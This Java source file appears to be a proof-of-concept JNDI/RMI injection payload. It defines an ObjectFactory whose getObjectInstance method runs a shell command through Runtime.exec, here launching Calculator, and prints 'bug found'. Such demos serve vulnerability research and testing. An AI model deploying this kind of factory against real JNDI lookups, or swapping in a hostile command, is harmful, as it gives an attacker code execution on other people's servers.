package com.jz.demo.rmi;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Hashtable;

public class TestCommand implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        InputStream in = new BufferedInputStream(Runtime.getRuntime().exec("open -na Calculator").getInputStream());
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String lineStr;
        StringBuilder result = new StringBuilder();
        while ((lineStr = reader.readLine()) != null)
            result.append(lineStr).append("\n");
        reader.close();
        in.close();
        System.out.println("发现bug");
        System.out.println(result);
        return null;
    }
}

